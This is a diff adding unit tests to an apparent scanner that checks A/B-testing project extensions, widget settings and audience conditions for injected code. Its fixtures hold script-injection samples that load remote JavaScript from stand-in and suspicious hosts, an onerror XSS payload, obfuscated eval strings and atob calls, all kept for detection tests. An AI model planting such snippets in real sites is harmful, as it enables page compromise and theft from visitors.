@@ -82,3 +82,44 @@ test('security project list covers every dashboard project, with unique numeric 
   for (const p of PROJECTS) assert.ok(ids.includes(p.id), p.name);
   assert.equal(PROJECTS.length, 3);
 });
+
+test('extension templates are scanned part by part, and widget settings are scanned', () => {
+  const raw = { project: {}, pages: [],
+    extensions: [{ id: 1, name: 'Promo widget', enabled: true, implementation: { html: '<div></div>', css: '.a{}', apply_js: 'var s=document.createElement("script");s.src="https://x.1688360.cc/a.js"', undo_js: '', reset_js: 'atob("x")' }, fields: [{ api_name: 'title', default_value: '<img src=x onerror=alert(1)>' }] }],
+    experiments: [{ id: 2, name: 'E', status: 'running', variations: [{ name: 'V', actions: [{ changes: [{ type: 'widget', extension_id: 'abc', name: 'w', config: { titleCopy: '<script src="https://evil.example.net/x.js"></script>' }, dependencies: [] }] }] }] }] };
+  const sources = collectSources(raw);
+  assert.deepEqual(sources.filter(s => s.kind === 'extension').map(s => s.field).sort(), ['apply_js', 'css', 'fields', 'html', 'reset_js']);
+  assert.ok(sources.some(s => s.kind === 'widget-config'));
+  assert.ok(!sources.some(s => s.code === '[]'));
+  const r = scanProject(raw);
+  assert.ok(r.findings.some(f => f.kind === 'extension' && f.field === 'apply_js' && f.rule === 'ioc-domain'));
+  assert.ok(r.findings.some(f => f.kind === 'extension' && f.field === 'reset_js' && f.rule === 'atob'));
+  assert.ok(r.findings.some(f => f.kind === 'widget-config' && f.rule === 'external-url'));
+});
+
+test('translated labels, regex literals and stringified JSON do not produce false positives', () => {
+  assert.deepEqual(scanCode(String.raw`var t = { pl: "PROMOCJA \u015ACIOWY", jp: "\u5272\u5F15\u30D1\u30C3\u30AF" }; if (/a/i.test(url.pathname)) x(); var re=//i.test(y);`), []);
+  assert.ok(scanCode(String.raw`var a="\u0065\u0076\u0061\u006c";`).some(f => f.rule === 'obfuscation'));
+  assert.ok(scanCode(String.raw`a("\x65\x76\x61\x6c")`).some(f => f.rule === 'obfuscation'));
+  assert.ok(scanCode('x="//cdn.evil.example.net/a.js"').some(f => f.rule === 'external-url'));
+  const long = JSON.stringify({ t: 'x'.repeat(3000) });
+  assert.equal(scanCode(long, { longLines: false }).length, 0);
+  assert.ok(scanCode(long).some(f => f.rule === 'long-line'));
+  const r = scanProject({ project: {}, pages: [], extensions: [], experiments: [{ id: 1, name: 'E', variations: [{ name: 'V', actions: [{ changes: [{ type: 'widget', name: 'w', config: { t: 'x'.repeat(3000) } }] }] }] }] });
+  assert.equal(r.findings.length, 0);
+});
+
+test('audience JavaScript (code) conditions are scanned, including nested and JSON-string conditions; data conditions are not', () => {
+  const raw = { project: {}, experiments: [], pages: [], extensions: [], audiences: [
+    { id: 1, name: 'aud-bad', conditions: ['and', ['or', ['or', { type: 'code', value: 'return atob("x") && /1688360\.cc/.test(location.href)' }]]] },
+    { id: 2, name: 'aud-json', archived: true, conditions: JSON.stringify(['and', { type: 'code', value: 'eval("1")' }]) },
+    { id: 3, name: 'aud-data', conditions: ['and', { type: 'custom_attribute', value: 'enus' }, { type: 'device', value: 'mobile' }] },
+    { id: 4, name: 'aud-clean', conditions: ['and', { type: 'code', value: '(function(){ return window.matchMedia("(max-width: 575px)").matches; })();' }] }] };
+  const sources = collectSources(raw).filter(s => s.kind === 'audience-code');
+  assert.deepEqual(sources.map(s => s.name).sort(), ['aud-bad', 'aud-clean', 'aud-json']);
+  const r = scanProject(raw);
+  assert.equal(r.scannedAudiences, 4);
+  assert.ok(r.findings.some(f => f.kind === 'audience-code' && f.entityName === 'aud-bad' && f.rule === 'atob'));
+  assert.ok(r.findings.some(f => f.kind === 'audience-code' && f.entityName === 'aud-json' && f.rule === 'eval' && f.archived));
+  assert.ok(!r.findings.some(f => f.entityName === 'aud-clean' || f.entityName === 'aud-data'));
+});
